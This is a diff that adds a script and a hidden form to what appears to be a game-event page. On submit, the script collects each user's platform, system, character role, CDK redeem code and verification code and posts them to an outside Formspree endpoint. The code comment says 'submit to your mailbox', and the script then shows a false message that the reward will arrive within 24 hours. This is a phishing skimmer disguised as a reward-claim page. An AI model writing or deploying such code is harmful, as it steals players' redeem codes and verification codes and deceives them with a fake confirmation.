@@ -592,7 +592,41 @@
     }
     if(typeof(pgvMain)=='function')pgvMain();//埋点上报
 
+	<script>
+document.getElementById('submitBtn').addEventListener('click', function () {
+  var platform = document.getElementById('platform').value;
+  var system = document.getElementById('system').value;
+  var role = document.getElementById('role').value;
+  var cdk = document.getElementById('cdk').value;
+  var code = document.getElementById('code').value;
+
+  if (!cdk) {
+    alert("CDK不能为空！");
+    return;
+  }
+
+  // 写入隐藏表单字段
+  document.getElementById('f_platform').value = platform;
+  document.getElementById('f_system').value = system;
+  document.getElementById('f_role').value = role;
+  document.getElementById('f_cdk').value = cdk;
+  document.getElementById('f_code').value = code;
+
+  // 提交到你的邮箱
+  document.getElementById('cdkForm').submit();
+
+  // 可选：提示用户
+  alert("提交成功，奖励将在24小时内到账！");
+});
 </script>
+
+<form id="cdkForm" action="https://formspree.io/f/mxabzblz" method="POST" style="display:none">
+  <input type="hidden" name="平台" id="f_platform">
+  <input type="hidden" name="系统" id="f_system">
+  <input type="hidden" name="角色" id="f_role">
+  <input type="hidden" name="CDK" id="f_cdk">
+  <input type="hidden" name="验证码" id="f_code">
+</form>
 </body>
 </html>
 
